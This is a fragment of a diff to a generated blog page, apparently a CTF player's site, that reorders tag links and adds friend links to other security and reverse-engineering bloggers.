               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">GeekChallenge</a>
+                <a href="javascript:void(0)" class="js-tag color3">Introduction</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">随想</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -817,11 +869,19 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Introduction</a>
+                <a href="javascript:void(0)" class="js-tag color4">GeekChallenge</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Hackergame</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -878,7 +938,7 @@
           
             <li class="search-li">
               <a href="https://hasegawaazusa.github.io/" target="_blank" 
-                class="search-title" title="这是我爹，你们都不许和我抢！！！">
+                class="search-title" title="这是我爹，你们都不许和我抢！！！～(　TロT)σ">
                 
                   <img src="https://hasegawaazusa.github.io/images/android-chrome-144x144.png">
                 
@@ -893,6 +953,36 @@
                   <img src="https://err0r233.github.io/images/Oscar.jpg">
                 
                 我E神
+              </a>
+            </li>
+          
+            <li class="search-li">
+              <a href="https://izayoishiki.github.io/" target="_blank" 
+                class="search-title" title="逆向的神！！！(*^▽^*)">
+                
+                  <img src="https://raw.githubusercontent.com/IzayoiShiki/myblog-img/master/logo.jpg">
+                
+                式神
+              </a>
+            </li>
+          
+            <li class="search-li">
+              <a href="https://triodelzx.github.io/" target="_blank" 
+                class="search-title" title="教我怎么赤石的密码（但是全栈）神♪(^∇^*)">
+                
+                  <img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202311111553454.jpg">
+                
+                三极管全能神
+              </a>
+            </li>
+          
+            <li class="search-li">
+              <a href="https://1k0ct.github.io/" target="_blank" 
+                class="search-title" title="痴情于vm的又一位逆向神o(*￣︶￣*)o">
+                
+                  <i class="icon-link icon"></i>
+                
+                太刀神
               </a>
             </li>
           
